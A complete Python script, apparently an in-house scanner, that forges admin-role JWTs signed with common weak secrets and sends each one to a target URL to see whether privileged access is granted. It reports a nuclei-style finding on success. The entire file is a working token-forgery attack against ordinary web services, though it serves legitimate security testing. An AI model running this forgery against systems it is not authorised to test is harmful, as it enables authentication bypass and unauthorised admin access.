#!/usr/bin/env python3
"""In-house deterministic JWT weak-secret prober (no GPL deps). Forges an admin HS256
token against a small secret wordlist and checks whether the target accepts it; emits a
nuclei-style JSONL finding on the first secret that yields privileged access.
"""

import base64
import hashlib
import hmac
import json
import sys
import urllib.request

WEAK_SECRETS = ["secret", "password", "admin", "changeme", "jwt", "key", "1234567890"]


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge(secret: str, claims: dict) -> str:
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64url(json.dumps(claims).encode())
    sig = b64url(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
    return f"{header}.{payload}.{sig}"


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: jwt-probe <url>", file=sys.stderr)
        return 2
    url = sys.argv[1]
    for secret in WEAK_SECRETS:
        token = forge(secret, {"user": "attacker", "role": "admin"})
        req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                code, body = resp.getcode(), resp.read().decode("utf-8", "replace")
        except Exception:
            continue
        if code == 200 and "admin" in body:
            finding = {
                "template-id": "jwt-weak-secret",
                "info": {"severity": "high", "name": f"JWT signed with weak secret '{secret}' accepted (forged admin token)"},
                "host": url,
                "matched-at": url,
            }
            print(json.dumps(finding))
            return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
